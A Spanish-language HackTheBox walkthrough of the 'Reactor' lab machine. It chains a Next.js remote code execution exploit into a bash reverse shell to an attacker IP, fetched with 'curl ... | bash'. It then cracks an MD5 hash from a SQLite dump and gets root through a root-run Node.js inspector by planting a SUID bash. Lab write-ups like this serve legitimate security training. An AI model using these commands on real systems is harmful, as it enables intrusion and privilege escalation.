# Writeup - Reactor (HackTheBox)

**Máquina:** Reactor  
**Plataforma:** HackTheBox  
**Sistema:** Linux Ubuntu  
**IP:** 10.129.38.40  
**Objetivo:** Obtener user.txt y root.txt

## Resumen

Máquina Linux con una aplicación web Next.js 15.0.3. Se explota un **Server-Side Request Forgery (SSRF)** encadenado a un comando arbitrario en el motor de renderizado de Next.js (CVE-2025-55182) para obtener RCE como `node`. Se pivota al usuario `engineer` mediante crackeo de hash MD5. La escalada a root aprovecha el inspector de Node.js (`--inspect`) abierto en localhost ejecutándose como root.

---

## Enumeración

### Nmap

```bash
nmap -p- -sS --open --min-rate=5000 -n -Pn 10.129.38.40 -oG tcp_scan.txt
nmap -p22,3000 -sCV -vvv 10.129.38.40 -oN full_scan.txt
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 3000/tcp | HTTP | Next.js 15.0.3 |

### Web (puerto 3000)

- **whatweb:** `ReactorWatch | Core Monitoring System` (Next.js)
- **Nuclei:** sin vulnerabilidades críticas, solo información de cabeceras
- **Wappalyzer:** Next.js 15.0.3, Tailwind CSS

---

## Intrusión inicial — RCE como `node`

### CVE-2025-55182

La aplicación Next.js es vulnerable a un SSRF que permite ejecución remota de comandos a través del motor de renderizado del lado del servidor.

```bash
python3 CVE-2025-55182.py -t http://10.129.38.40:3000/ -c 'id'
# uid=999(node) gid=988(node) groups=988(node)
```

Se obtiene una reverse shell:

```bash
# Atacante:
echo 'bash -i >& /dev/tcp/10.10.14.55/4444 0>&1' > shell.sh
python3 -m http.server 80

# Exploit:
python3 CVE-2025-55182.py -t http://10.129.38.40:3000/ -c 'curl http://10.10.14.55/shell.sh|bash'
```

Tras recibir la shell se estabiliza con penelope y se obtiene acceso como `node`.

---

## Pivot a `engineer`

### Descubrimientos en la máquina

- Base de datos SQLite: `/opt/reactor-app/reactor.db`
- Variables de entorno con credenciales:

```
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
```

### Hashes de la base de datos

```sql
sqlite3 /opt/reactor-app/reactor.db .dump

INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
```

### Crackeo del hash

```bash
echo 'engineer:39d97110eafe2a9a68639812cd271e8e' > engineer_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 engineer_hash.txt
```

**Credencial:** `engineer:reactor1`

### Cambio de usuario

```bash
su engineer
# Password: reactor1
```

Se lee `user.txt`:

```bash
cat /home/engineer/user.txt
# <REDACTED>
```

---

## Escalada a root

### Descubrimiento

El proceso `uptime-monitor` corre como **root** con el inspector de Node.js abierto en `127.0.0.1:9229`:

```bash
ps aux | grep root
# root ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

### Explotación del inspector

Desde la propia máquina como `engineer`, se accede al inspector y se ejecuta código arbitratio como **root**:

```bash
node inspect 127.0.0.1:9229
debug> exec("process.getuid()")
# 0

debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/pwned && chmod +s /tmp/pwned')")
# Uint8Array(0)
```

Se copia `/bin/bash` a `/tmp/pwned` con SUID y se ejecuta:

```bash
/tmp/pwned -p
# pwned-5.2#
whoami
# root
```

Se lee la flag de root:

```bash
cat /root/root.txt
# <REDACTED>
```

---

## Flags

| Flag | Valor |
|------|-------|
| **user.txt** | `<REDACTED>` |
| **root.txt** | `<REDACTED>` |

---

## Resumen de la cadena de ataque

```
Nmap → Puerto 3000 (Next.js 15.0.3)
  ↓
CVE-2025-55182 (SSRF → RCE)
  ↓
Shell como node
  ↓
Crackeo MD5 (engineer:reactor1)
  ↓
Shell como engineer
  ↓
Node.js inspector (--inspect=127.0.0.1:9229) corriendo como root
  ↓
SUID bash → shell como root
  ↓
root.txt
```
